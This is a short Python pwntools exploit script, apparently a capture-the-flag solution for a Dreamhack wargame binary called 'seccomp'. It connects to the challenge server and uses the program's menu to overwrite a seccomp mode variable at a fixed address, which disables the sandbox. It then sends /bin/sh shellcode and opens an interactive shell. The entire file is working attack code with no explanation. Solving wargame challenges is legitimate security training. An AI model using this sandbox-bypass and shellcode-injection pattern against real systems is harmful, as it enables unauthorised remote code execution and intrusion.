#!/usr/bin/python3 
from pwn import * 

context.arch = "amd64"
context.log_level = "debug"
context.binary = elf = ELF('./seccomp')

mode = 0x602090
# p = process('./seccomp')
p = remote('host3.dreamhack.games', 11769)
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'addr: ', str(mode))
p.sendlineafter(b'value: ', b'0')
p.sendlineafter(b'> ', b'1') 
shellcode = shellcraft.sh()
payload = asm(shellcode)
p.sendlineafter(b'shellcode: ', payload)
p.sendlineafter(b'> ', b'2')
p.interactive()
